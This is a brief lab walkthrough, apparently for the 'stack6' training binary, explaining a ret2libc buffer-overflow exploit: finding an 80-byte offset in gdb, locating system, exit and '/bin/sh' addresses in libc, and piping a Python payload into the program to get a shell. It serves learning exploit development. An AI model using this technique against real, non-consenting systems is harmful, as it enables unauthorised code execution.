# using ret2libc to open a  shell 

+ open the program using gdb
+ set disassembly language to main
+ disassemble the getpath since the main just calls for the getpath function
+ use 64 byte val and give it as input and callculate the offset or padding of the stack(in this case it's 80)
+ and then check for segmentation fault by giving more than 80 bytes
+ now we need to find where to return to inorder to execute a shell
+ we will seetup a ret2libc exploit(i.e)Padding+System_Address+Exit_Address+Shell_Addres
    * why Exit Address? since we are setting the return instruction pointer to a system function we need to return something(consider what call function would do if it calls a function first it places a return address on stack an execute the function the same goes for this scenario)
    * you can return anything ((eg)) you can return a NOP instruction or SEGFAULT anything
+ find the address of system, /bin/sh, libc
+ system: p system(in gdb) => 0xb7ecffb0
+ exit: p exit => 0xb7ec60c0
+ /bin/sh: 
    * info proc map(find the libc function's start address) => 0xb7e97000 
    * strings -a -t x lib/libc-2.11.2.so | grep "/bin/sh"(offset of /bin/sh) => 0x11f3bf
    * libc_address+offset => actual /bin/sh memory address => 0xb7fb63bf
+ prepare the payload
+ execute it
+ (python exploit.py;cat)|./stack6 

## note: by default struct will pack the value in little endian